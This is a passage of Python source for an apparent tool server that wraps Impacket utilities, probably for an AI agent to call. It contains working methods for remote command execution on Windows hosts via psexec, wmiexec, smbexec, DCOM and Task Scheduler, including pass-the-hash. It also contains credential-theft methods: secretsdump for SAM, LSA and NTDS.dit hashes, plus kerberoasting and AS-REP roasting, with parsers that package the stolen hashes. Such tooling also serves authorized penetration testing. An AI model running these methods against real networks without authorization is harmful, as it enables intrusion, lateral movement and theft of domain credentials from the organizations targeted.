        """Check combined stdout+stderr for known error patterns.

        Impacket tools often exit with returncode 0 even when they fail.
        This method catches those false-success cases.
        """
        return any(pat in combined for pat in self._ERROR_PATTERNS)

    def _classify_kerberos_error(self, text: str) -> tuple:
        """Classify Kerberos errors by error code.

        Returns (error_class, retryable, suggestions).
        """
        if "KRB_AP_ERR_SKEW" in text:
            return ("config", True, [
                "Clock skew too great — use clock_offset parameter on the mcp_tool call to match the target DC time",
                "Use 'nmap -sV -p 88 <dc_ip>' or 'net time' to discover the DC's time",
            ])
        if "KDC_ERR_PREAUTH_FAILED" in text:
            return ("auth", False, [
                "Pre-authentication failed — wrong password, hash, or AES key",
                "Verify credentials are correct for this domain",
            ])
        if "KDC_ERR_C_PRINCIPAL_UNKNOWN" in text:
            return ("auth", False, [
                "User principal not found in Kerberos database",
                "Check username and domain are correct",
            ])
        if "KDC_ERR_S_PRINCIPAL_UNKNOWN" in text:
            return ("params", False, [
                "Service principal not found — verify the SPN is correct",
                "Use 'find_delegation' or 'kerberoast' to discover valid SPNs",
            ])
        if "KDC_ERR_CLIENT_REVOKED" in text:
            return ("auth", False, [
                "Account is locked or disabled",
            ])
        if "KRB_ERR_GENERIC" in text or "KDC_ERR_BADOPTION" in text:
            return ("config", True, [
                "Kerberos configuration error — check domain, DC IP, and authentication params",
            ])
        if "KDC_ERR_KEY_EXPIRED" in text:
            return ("auth", False, [
                "Password has expired — use changepasswd to reset",
            ])
        if "KDC_ERR_ETYPE_NOSUPP" in text:
            return ("config", False, [
                "Encryption type not supported — the DC may not support the requested encryption",
            ])
        # Generic Kerberos error
        if "KerberosError" in text or "Kerberos SessionError" in text:
            return ("auth", False, [])
        return ("unknown", False, [])

    def _classify_smb_error(self, text: str) -> tuple:
        """Classify SMB/RPC errors by status code.

        Returns (error_class, retryable, suggestions).
        """
        if "STATUS_LOGON_FAILURE" in text:
            return ("auth", False, [
                "Logon failed — wrong username, password, or domain",
            ])
        if "STATUS_ACCESS_DENIED" in text:
            return ("permission", False, [
                "Access denied — insufficient privileges for this operation",
                "Try with a higher-privileged account or different authentication method",
            ])
        if "STATUS_ACCOUNT_DISABLED" in text:
            return ("auth", False, [
                "Account is disabled",
            ])
        if "STATUS_ACCOUNT_LOCKED_OUT" in text:
            return ("auth", False, [
                "Account is locked out — wait or unlock via ADUC",
            ])
        if "STATUS_PASSWORD_EXPIRED" in text:
            return ("auth", False, [
                "Password expired — use changepasswd to set a new password",
            ])
        if "STATUS_PASSWORD_MUST_CHANGE" in text:
            return ("auth", False, [
                "Password must be changed before login — use changepasswd",
            ])
        if "Connection refused" in text:
            return ("network", True, [
                "Connection refused — target may be down or port is filtered",
            ])
        if "STATUS_SHARING_VIOLATION" in text:
            return ("permission", True, [
                "File is locked by another process — retry later",
            ])
        if "STATUS_BAD_NETWORK_NAME" in text:
            return ("params", False, [
                "Share name not found — verify the share name exists",
            ])
        if "SessionError" in text:
            return ("unknown", False, [])
        return ("unknown", False, [])

    def _classify_error(self, text: str) -> tuple:
        """Classify any impacket error. Returns (error_class, retryable, suggestions)."""
        if not text:
            return ("unknown", False, [])
        # Try Kerberos first
        if "Kerberos" in text or "KRB_" in text or "KDC_ERR" in text:
            return self._classify_kerberos_error(text)
        # Then SMB
        if "STATUS_" in text or "SMB SessionError" in text or "Connection refused" in text:
            return self._classify_smb_error(text)
        # DRSUAPI errors
        if "ERROR_DS_DRA" in text:
            return ("permission", False, [
                "DRSUAPI replication error — insufficient privileges or wrong target",
                "Try with -use-vss flag as an alternative",
            ])
        # Traceback
        if "Traceback" in text:
            return ("unknown", True, [])
        return ("unknown", False, [])

    def _parse_secretsdump_output(self, stdout: str, stderr: str, output_prefix: str) -> Dict[str, Any]:
        """Parse secretsdump output and any generated files."""
        combined = stdout + stderr
        result = {
            "sam_hashes": [],
            "lsa_secrets": [],
            "cached_creds": [],
            "ntds_hashes": [],
            "kerberos_keys": [],
        }

        section = None
        for line in combined.split("\n"):
            line = line.strip()
            if not line:
                continue

            if "[*] Dumping local SAM hashes" in line:
                section = "sam"
                continue
            elif "[*] Dumping LSA Secrets" in line:
                section = "lsa"
                continue
            elif "[*] Dumping cached domain logon" in line:
                section = "cached"
                continue
            elif "[*] Dumping Domain Credentials" in line or "[*] Using the DRSUAPI" in line:
                section = "ntds"
                continue
            elif "[*] Kerberos keys grabbed" in line:
                section = "kerberos"
                continue
            elif line.startswith("[*]") or line.startswith("[!]"):
                continue

            if section == "sam" and ":" in line:
                result["sam_hashes"].append(line)
            elif section == "lsa" and line:
                result["lsa_secrets"].append(line)
            elif section == "cached" and ":" in line:
                result["cached_creds"].append(line)
            elif section == "ntds" and ":" in line and not line.startswith("["):
                result["ntds_hashes"].append(line)
            elif section == "kerberos" and ":" in line:
                result["kerberos_keys"].append(line)

        # Also read output files if they exist
        for suffix, key in [
            (".sam", "sam_hashes"),
            (".secrets", "lsa_secrets"),
            (".cached", "cached_creds"),
            (".ntds", "ntds_hashes"),
        ]:
            filepath = output_prefix + suffix
            if os.path.exists(filepath):
                try:
                    with open(filepath, "r", errors="replace") as f:
                        file_lines = [l.strip() for l in f if l.strip()]
                    if file_lines and not result[key]:
                        result[key] = file_lines
                except Exception:
                    pass

        result["total_hashes"] = (
            len(result["sam_hashes"])
            + len(result["ntds_hashes"])
            + len(result["cached_creds"])
        )

        return result

    def _parse_kerberoast_output(self, stdout: str, stderr: str) -> Dict[str, Any]:
        """Parse GetUserSPNs (kerberoasting) output."""
        combined = stdout + stderr
        hashes = []
        users_with_spns = []

        current_hash = []
        in_hash = False

        for line in combined.split("\n"):
            # Detect new hash line — flush any pending hash first
            if line.startswith("$krb5tgs$"):
                if current_hash:
                    hashes.append("".join(current_hash))
                in_hash = True
                current_hash = [line.strip()]
                continue
            elif in_hash:
                if line.strip() and not line.startswith("[") and not line.startswith("Impacket"):
                    current_hash.append(line.strip())
                    continue
                else:
                    hashes.append("".join(current_hash))
                    current_hash = []
                    in_hash = False

            # Parse table output for SPN info
            match = re.match(r"^(\S+)\s+(\S+)\s+(\S+)\s+(.*?)$", line.strip())
            if match and not line.startswith("ServicePrincipalName") and not line.startswith("-"):
                spn, name, member_of, pwd_last_set = match.groups()
                if "/" in spn:  # SPN format validation
                    users_with_spns.append({
                        "spn": spn,
                        "username": name,
                        "member_of": member_of,
                        "pwd_last_set": pwd_last_set.strip(),
                    })

        # Catch final hash
        if current_hash:
            hashes.append("".join(current_hash))

        return {
            "hashes": hashes,
            "hash_count": len(hashes),
            "users_with_spns": users_with_spns,
            "user_count": len(users_with_spns),
        }

    def _parse_asreproast_output(self, stdout: str, stderr: str) -> Dict[str, Any]:
        """Parse GetNPUsers (AS-REP roasting) output."""
        combined = stdout + stderr
        hashes = []
        vulnerable_users = []

        current_hash = []
        in_hash = False

        for line in combined.split("\n"):
            if line.startswith("$krb5asrep$"):
                if current_hash:
                    hashes.append("".join(current_hash))
                in_hash = True
                current_hash = [line.strip()]
                continue
            elif in_hash:
                if line.strip() and not line.startswith("[") and not line.startswith("Impacket"):
                    current_hash.append(line.strip())
                    continue
                else:
                    hashes.append("".join(current_hash))
                    current_hash = []
                    in_hash = False

            if "does not require Kerberos preauthentication" in line:
                match = re.search(r"\$(\S+)", line)
                if match:
                    vulnerable_users.append(match.group(1))

        if current_hash:
            hashes.append("".join(current_hash))

        return {
            "hashes": hashes,
            "hash_count": len(hashes),
            "vulnerable_users": vulnerable_users,
        }

    def _parse_smb_shares(self, stdout: str, stderr: str) -> List[Dict[str, str]]:
        """Parse smbclient 'shares' command output.

        impacket-smbclient outputs share names one per line, sometimes
        preceded by '# ' prompt characters.  Format:
            # ADMIN$
            C$
            IPC$
        """
        shares = []
        combined = stdout + stderr

        # If the output looks like usage/help text (e.g. wrong port caused
        # impacket-smbclient to print its argparse help), return empty list
        # to avoid misinterpreting usage words as share names.
        if "usage:" in combined.lower() or "impacket-smbclient [-h]" in combined or "impacket-smbclient [" in combined:
            return shares

        for line in combined.split("\n"):
            stripped = line.strip().lstrip("# ").strip()
            # Skip empty, banners, prompts, and help text
            if not stripped or stripped.startswith("Impacket") or stripped.startswith("Type help") or stripped.startswith("["):
                continue
            # Tabular format: "ADMIN$    DISK    Remote Admin"
            match = re.match(r"^(\S+)\s+(DISK|IPC|PRINT)\s*(.*)?$", stripped)
            if match:
                shares.append({
                    "name": match.group(1),
                    "type": match.group(2),
                    "comment": (match.group(3) or "").strip(),
                })
                continue
            # Simple format: just share name per line (from impacket-smbclient 'shares' command)
            if stripped and not stripped.startswith("-") and "$" in stripped or stripped.isalnum() or stripped in ("NETLOGON", "SYSVOL", "Replication", "Users"):
                # Heuristic: looks like a share name (alphanumeric, possibly ending in $)
                if re.match(r"^[\w\$\-\.]+$", stripped) and len(stripped) < 50:
                    shares.append({
                        "name": stripped,
                        "type": "unknown",
                        "comment": "",
                    })
        return shares

    def _parse_ad_users(self, stdout: str, stderr: str) -> List[Dict[str, str]]:
        """Parse GetADUsers output."""
        users = []
        combined = stdout + stderr
        header_seen = False

        for line in combined.split("\n"):
            line = line.strip()
            if not line or line.startswith("[*]") or line.startswith("Impacket"):
                continue
            if line.startswith("Name") and "Email" in line:
                header_seen = True
                continue
            if line.startswith("----"):
                continue
            if header_seen and line:
                parts = line.split()
                if len(parts) >= 1:
                    user = {"name": parts[0]}
                    if len(parts) >= 2:
                        user["email"] = parts[1] if "@" in parts[1] else ""
                    if len(parts) >= 3:
                        user["created"] = " ".join(parts[-2:]) if len(parts) >= 4 else parts[-1]
                    users.append(user)

        return users

    def _parse_lookupsid_output(self, stdout: str, stderr: str) -> Dict[str, Any]:
        """Parse lookupsid output."""
        combined = stdout + stderr
        users = []
        groups = []
        aliases = []
        domain_sid = None

        for line in combined.split("\n"):
            line = line.strip()

            # Extract domain SID
            sid_match = re.match(r"^\[.*\]\s+Domain SID is:\s+(\S+)", line)
            if sid_match:
                domain_sid = sid_match.group(1)
                continue

            # Parse entries like: "500: DOMAIN\Administrator (SidTypeUser)"
            entry_match = re.match(r"^(\d+):\s+(\S+\\)?(.+?)\s+\((\w+)\)", line)
            if entry_match:
                rid = entry_match.group(1)
                domain_prefix = (entry_match.group(2) or "").rstrip("\\")
                name = entry_match.group(3)
                sid_type = entry_match.group(4)

                entry = {"rid": int(rid), "name": name, "type": sid_type}
                if domain_prefix:
                    entry["domain"] = domain_prefix

                if sid_type == "SidTypeUser":
                    users.append(entry)
                elif sid_type == "SidTypeGroup":
                    groups.append(entry)
                elif sid_type == "SidTypeAlias":
                    aliases.append(entry)

        return {
            "domain_sid": domain_sid,
            "users": users,
            "groups": groups,
            "aliases": aliases,
            "total": len(users) + len(groups) + len(aliases),
        }

    # ── Remote Execution Methods ─────────────────────────────────────────

    async def psexec(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        command: Optional[str] = None,
        service_name: Optional[str] = None,
        remote_binary_name: Optional[str] = None,
        upload_file: Optional[str] = None,
        codec: str = "utf-8",
        extra_args: Optional[str] = None,
        timeout: int = 120,  # unused: client controls timeout via heartbeat cancellation
    ) -> ToolResult:
        """Execute commands via PsExec (SMB service creation)."""
        self.logger.info(f"PsExec to {target}")

        target_str, auth_extra = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-psexec"]
        cmd.extend(auth_extra)
        if service_name:
            cmd.extend(["-service-name", service_name])
        if remote_binary_name:
            cmd.extend(["-remote-binary-name", remote_binary_name])
        if upload_file:
            cmd.extend(["-c", upload_file])
        if codec != "utf-8":
            cmd.extend(["-codec", codec])
        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(target_str)
        if command:
            cmd.append(command)

        try:
            auth_env = self._get_auth_env() if kerberos else {}
            result = await self.run_command_with_progress(cmd, env=auth_env)
            parsed = self._parse_exec_output(result.stdout, result.stderr)
            combined = result.stdout + result.stderr

            has_error = self._has_error_in_output(combined)
            success = (result.returncode == 0 or bool(parsed["output"].strip())) and not has_error

            # PsExec-specific: if every share was "not writable" and there is
            # no real command output (only [-] warning lines), the user lacks
            # admin privileges.  parsed["output"] may contain the [-] lines
            # because _parse_exec_output only strips [*] and [!].
            if success and "is not writable" in combined:
                # Strip [-] lines from output to see if any *real* output remains
                real_output = "\n".join(
                    l for l in parsed["output"].split("\n")
                    if not l.strip().startswith("[-]")
                ).strip()
                if not real_output:
                    success = False

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                # Provide a specific error message and class for the "no writable share" case
                if "is not writable" in combined and not error_class:
                    error_class = "permission"
                    suggestions = [
                        "No writable share found — user lacks admin privileges for PsExec",
                        "Try wmiexec or smbexec as alternatives, or use an admin account",
                    ]
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "PsExec failed"

            return ToolResult(
                success=success,
                data={
                    "method": "psexec",
                    "target": target,
                    "command": command,
                    **parsed,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            error_class, retryable, suggestions = self._classify_error(str(e))
            return ToolResult(
                success=False, data={"target": target}, error=str(e),
                error_class=error_class, retryable=retryable, suggestions=suggestions,
            )

    async def wmiexec(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        command: Optional[str] = None,
        nooutput: bool = False,
        shell_type: Optional[str] = None,
        silentcommand: bool = False,
        share: Optional[str] = None,
        codec: str = "utf-8",
        extra_args: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Execute commands via WMI (stealthier, no service creation)."""
        self.logger.info(f"WMIExec to {target}")

        target_str, auth_extra = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-wmiexec"]
        cmd.extend(auth_extra)
        if nooutput:
            cmd.append("-nooutput")
        if silentcommand:
            cmd.append("-silentcommand")
        if shell_type:
            cmd.extend(["-shell-type", shell_type])
        if share:
            cmd.extend(["-share", share])
        if codec != "utf-8":
            cmd.extend(["-codec", codec])
        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(target_str)
        if command:
            cmd.append(command)

        try:
            auth_env = self._get_auth_env() if kerberos else {}
            result = await self.run_command_with_progress(cmd, env=auth_env)
            parsed = self._parse_exec_output(result.stdout, result.stderr)
            combined = result.stdout + result.stderr

            has_error = self._has_error_in_output(combined)
            success = (result.returncode == 0 or bool(parsed["output"].strip())) and not has_error

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "WMIExec failed"

            return ToolResult(
                success=success,
                data={
                    "method": "wmiexec",
                    "target": target,
                    "command": command,
                    **parsed,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            error_class, retryable, suggestions = self._classify_error(str(e))
            return ToolResult(
                success=False, data={"target": target}, error=str(e),
                error_class=error_class, retryable=retryable, suggestions=suggestions,
            )

    async def smbexec(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        command: Optional[str] = None,
        share: str = "C$",
        mode: str = "SHARE",
        codec: str = "utf-8",
        extra_args: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Execute commands via SMB (native commands, no binary upload)."""
        self.logger.info(f"SMBExec to {target}")

        target_str, auth_extra = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-smbexec"]
        cmd.extend(auth_extra)
        cmd.extend(["-share", share])
        cmd.extend(["-mode", mode])
        if codec != "utf-8":
            cmd.extend(["-codec", codec])
        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(target_str)

        # smbexec is interactive (no command positional arg). Pipe command to stdin.
        auth_env = self._get_auth_env() if kerberos else {}
        merged_env = {**os.environ, **auth_env} if auth_env else None
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                env=merged_env,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            stdin_data = f"{command}\nexit\n".encode() if command else b"exit\n"
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(input=stdin_data),
                timeout=timeout,
            )

            stdout_str = stdout.decode("utf-8", errors="replace")
            stderr_str = stderr.decode("utf-8", errors="replace")
            parsed = self._parse_exec_output(stdout_str, stderr_str)
            combined = stdout_str + stderr_str

            has_error = self._has_error_in_output(combined)
            success = (proc.returncode == 0 or bool(parsed["output"].strip())) and not has_error

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "SMBExec failed"

            return ToolResult(
                success=success,
                data={
                    "method": "smbexec",
                    "target": target,
                    "command": command,
                    **parsed,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            raise ToolError(message=f"SMBExec timed out after {timeout}s")
        except ToolError:
            raise
        except Exception as e:
            error_class, retryable, suggestions = self._classify_error(str(e))
            return ToolResult(
                success=False, data={"target": target}, error=str(e),
                error_class=error_class, retryable=retryable, suggestions=suggestions,
            )

    async def dcomexec(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        command: Optional[str] = None,
        dcom_object: str = "MMC20",
        nooutput: bool = False,
        silentcommand: bool = False,
        codec: str = "utf-8",
        extra_args: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Execute commands via DCOM objects."""
        self.logger.info(f"DCOMExec to {target} using {dcom_object}")

        target_str, auth_extra = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-dcomexec"]
        cmd.extend(auth_extra)
        cmd.extend(["-object", dcom_object])
        if nooutput:
            cmd.append("-nooutput")
        if silentcommand:
            cmd.append("-silentcommand")
        if codec != "utf-8":
            cmd.extend(["-codec", codec])
        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(target_str)
        if command:
            cmd.append(command)

        try:
            auth_env = self._get_auth_env() if kerberos else {}
            result = await self.run_command_with_progress(cmd, env=auth_env)
            parsed = self._parse_exec_output(result.stdout, result.stderr)

            combined = result.stdout + result.stderr
            has_error = self._has_error_in_output(combined)
            success = (result.returncode == 0 or bool(parsed["output"].strip())) and not has_error

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "DCOMExec failed"

            return ToolResult(
                success=success,
                data={
                    "method": "dcomexec",
                    "target": target,
                    "command": command,
                    "object": dcom_object,
                    **parsed,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            error_class, retryable, suggestions = self._classify_error(str(e))
            return ToolResult(
                success=False, data={"target": target}, error=str(e),
                error_class=error_class, retryable=retryable, suggestions=suggestions,
            )

    async def atexec(
        self,
        target: str,
        command: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        codec: str = "utf-8",
        extra_args: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Execute commands via Task Scheduler."""
        self.logger.info(f"AtExec to {target}: {command}")

        target_str, auth_extra = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-atexec"]
        cmd.extend(auth_extra)
        if codec != "utf-8":
            cmd.extend(["-codec", codec])
        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(target_str)
        cmd.append(command)

        try:
            auth_env = self._get_auth_env() if kerberos else {}
            result = await self.run_command_with_progress(cmd, env=auth_env)
            parsed = self._parse_exec_output(result.stdout, result.stderr)

            combined = result.stdout + result.stderr
            has_error = self._has_error_in_output(combined)
            success = (result.returncode == 0 or bool(parsed["output"].strip())) and not has_error

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "AtExec failed"

            return ToolResult(
                success=success,
                data={
                    "method": "atexec",
                    "target": target,
                    "command": command,
                    **parsed,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            error_class, retryable, suggestions = self._classify_error(str(e))
            return ToolResult(
                success=False, data={"target": target}, error=str(e),
                error_class=error_class, retryable=retryable, suggestions=suggestions,
            )

    # ── Credential Attack Methods ────────────────────────────────────────

    async def secretsdump(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        just_dc: bool = False,
        just_dc_ntlm: bool = False,
        just_dc_user: Optional[str] = None,
        use_vss: bool = False,
        exec_method: Optional[str] = None,
        history: bool = False,
        pwd_last_set: bool = False,
        user_status: bool = False,
        skip_sam: bool = False,
        use_keylist: bool = False,
        ldapfilter: Optional[str] = None,
        extra_args: Optional[str] = None,
        timeout: int = 600,
    ) -> ToolResult:
        """Dump credentials from a Windows host (SAM/LSA/NTDS.dit)."""
        self.logger.info(f"Secretsdump against {target}")

        target_str, auth_extra = self._build_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        # Create temp directory for secretsdump output files
        tmpdir = tempfile.mkdtemp(prefix="secretsdump_")
        output_prefix = os.path.join(tmpdir, "secretsdump")

        cmd = ["impacket-secretsdump"]
        cmd.extend(auth_extra)
        cmd.extend(["-outputfile", output_prefix])

        if just_dc:
            cmd.append("-just-dc")
        if just_dc_ntlm:
            cmd.append("-just-dc-ntlm")
        if just_dc_user:
            cmd.extend(["-just-dc-user", just_dc_user])
        if use_vss:
            cmd.append("-use-vss")
        if exec_method:
            cmd.extend(["-exec-method", exec_method])
        if history:
            cmd.append("-history")
        if pwd_last_set:
            cmd.append("-pwd-last-set")
        if user_status:
            cmd.append("-user-status")
        if skip_sam:
            cmd.append("-skip-sam")
        if use_keylist:
            cmd.append("-use-keylist")
        if ldapfilter:
            cmd.extend(["-ldapfilter", ldapfilter])

        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(target_str)

        def _secretsdump_progress(line: str) -> Optional[str]:
            """Extract meaningful progress from secretsdump output."""
            if "[*] Dumping local SAM" in line:
                return "Dumping SAM hashes..."
            if "[*] Dumping LSA" in line:
                return "Dumping LSA secrets..."
            if "[*] Dumping cached" in line:
                return "Dumping cached credentials..."
            if "[*] Dumping Domain" in line or "[*] Using the DRSUAPI" in line:
                return "Dumping NTDS.dit via DRSUAPI..."
            if "[*] Kerberos keys" in line:
                return "Extracting Kerberos keys..."
            return None

        try:
            auth_env = self._get_auth_env() if kerberos else {}
            result = await self.run_command_with_progress(
                cmd, env=auth_env,
                progress_filter=_secretsdump_progress,
            )
            parsed = self._parse_secretsdump_output(result.stdout, result.stderr, output_prefix)
            combined = result.stdout + result.stderr

            has_error = self._has_error_in_output(combined)
            success = (result.returncode == 0 or parsed["total_hashes"] > 0) and not has_error

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "Secretsdump failed"

            return ToolResult(
                success=success,
                data={
                    "target": target,
                    **parsed,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            error_class, retryable, suggestions = self._classify_error(str(e))
            return ToolResult(
                success=False, data={"target": target}, error=str(e),
                error_class=error_class, retryable=retryable, suggestions=suggestions,
            )
        finally:
            # Clean up output files and temp directory
            for suffix in [".sam", ".secrets", ".cached", ".ntds", ".ntds.kerberos", ".ntds.cleartext"]:
                filepath = output_prefix + suffix
                if os.path.exists(filepath):
                    try:
                        os.unlink(filepath)
                    except OSError:
                        pass
            try:
                os.rmdir(tmpdir)
            except OSError:
                pass

    async def kerberoast(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        request_user: Optional[str] = None,
        output_format: str = "hashcat",
        target_domain: Optional[str] = None,
        stealth: bool = False,
        no_preauth: Optional[str] = None,
        extra_args: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Kerberoasting - extract TGS service ticket hashes."""
        self.logger.info(f"Kerberoasting against {target}")

        identity_str, auth_extra = self._build_domain_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-GetUserSPNs"]
        cmd.extend(auth_extra)
        cmd.append("-request")

        john_output_file = None
        if request_user:
            cmd.extend(["-request-user", request_user])
        if output_format == "john":
            john_output_file = "/tmp/kerberoast_john.txt"
            cmd.extend(["-outputfile", john_output_file])
        if target_domain:
            cmd.extend(["-target-domain", target_domain])
        if stealth:
            cmd.append("-stealth")
        if no_preauth:
            cmd.extend(["-no-preauth", no_preauth])

        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(identity_str)

        try:
            auth_env = self._get_auth_env() if kerberos else {}
            result = await self.run_command_with_progress(
                cmd, env=auth_env,
            )
            parsed = self._parse_kerberoast_output(result.stdout, result.stderr)
            combined = result.stdout + result.stderr

            # Bug 5 fix: john format writes hashes to file instead of stdout.
            # Read the output file and merge into parsed hashes.
            if john_output_file and os.path.exists(john_output_file):
                try:
                    with open(john_output_file, "r") as f:
                        file_hashes = [line.strip() for line in f if line.strip()]
                    if file_hashes and not parsed["hashes"]:
                        parsed["hashes"] = file_hashes
                        parsed["hash_count"] = len(file_hashes)
                except Exception:
                    pass
                finally:
                    try:
                        os.unlink(john_output_file)
                    except OSError:
                        pass

            has_error = self._has_error_in_output(combined)
            success = (result.returncode == 0 or parsed["hash_count"] > 0) and not has_error

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "Kerberoast failed"

            return ToolResult(
                success=success,
                data={
                    "target": target,
                    "format": output_format,
                    **parsed,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            error_class, retryable, suggestions = self._classify_error(str(e))
            return ToolResult(
                success=False, data={"target": target}, error=str(e),
                error_class=error_class, retryable=retryable, suggestions=suggestions,
            )

    async def asreproast(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        usersfile: Optional[str] = None,
        output_format: str = "hashcat",
        extra_args: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """AS-REP Roasting - extract hashes for accounts without pre-auth."""
        self.logger.info(f"AS-REP Roasting against {target}")

        identity_str, auth_extra = self._build_domain_auth_args(
            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
        )

        cmd = ["impacket-GetNPUsers"]
        cmd.extend(auth_extra)
        cmd.append("-request")

        if usersfile:
            cmd.extend(["-usersfile", usersfile])
        if output_format == "john":
            cmd.extend(["-format", "john"])
        else:
            cmd.extend(["-format", "hashcat"])

        cmd.extend(self._parse_extra_args(extra_args))
        cmd.append(identity_str)

        try:
            auth_env = self._get_auth_env() if kerberos else {}
            result = await self.run_command_with_progress(cmd, env=auth_env)
            parsed = self._parse_asreproast_output(result.stdout, result.stderr)
            combined = result.stdout + result.stderr

            has_error = self._has_error_in_output(combined)
            success = (result.returncode == 0 or parsed["hash_count"] > 0) and not has_error

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else "AS-REP roast failed"

            return ToolResult(
                success=success,
                data={
                    "target": target,
                    "format": output_format,
                    **parsed,
                },
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            error_class, retryable, suggestions = self._classify_error(str(e))
            return ToolResult(
                success=False, data={"target": target}, error=str(e),
                error_class=error_class, retryable=retryable, suggestions=suggestions,
            )

    # ── SMB Operation Methods ────────────────────────────────────────────
